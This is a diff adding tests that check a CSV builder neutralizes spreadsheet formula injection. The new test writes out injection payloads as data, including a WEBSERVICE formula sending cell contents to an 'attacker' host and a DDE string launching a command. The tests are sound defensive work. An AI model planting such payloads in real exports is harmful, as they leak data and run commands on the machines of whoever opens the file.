@@ -35,6 +35,35 @@ describe("buildCsv", () => {
     expect(csv).toBe('"Header, ""quoted"""');
   });
 
+  it("neutralizes spreadsheet formula injection in attacker-controlled cells", () => {
+    const csv = buildCsv<Row>(
+      [
+        { email: null, name: "=WEBSERVICE(\"http://attacker/?\"&A1)", total: 1 },
+        { email: null, name: "+cmd|' /C calc'!A1", total: 2 },
+        { email: null, name: "-2+3", total: 3 },
+        { email: null, name: "@HYPERLINK(\"http://attacker\")", total: 4 },
+      ],
+      columns,
+    );
+    const lines = csv.split("\r\n");
+    expect(lines[1]).toContain("'=WEBSERVICE");
+    expect(lines[2]).toContain("'+cmd");
+    expect(lines[3]).toContain("'-2+3");
+    expect(lines[4]).toContain("'@HYPERLINK");
+    // No exported cell may still start with a formula trigger character.
+    for (const line of lines.slice(1)) {
+      expect(line.startsWith("=")).toBe(false);
+      expect(line.startsWith("+")).toBe(false);
+      expect(line.startsWith("-")).toBe(false);
+      expect(line.startsWith("@")).toBe(false);
+    }
+  });
+
+  it("keeps inline dashes untouched but guards leading-dash cells", () => {
+    const csv = buildCsv<Row>([{ email: null, name: "non-formula - dash", total: -5 }], columns);
+    expect(csv).toBe("Customer,Email,Total\r\nnon-formula - dash,,'-5");
+  });
+
   it("serializes empty rows to a header-only document", () => {
     expect(buildCsv<Row>([], columns)).toBe("Customer,Email,Total");
   });
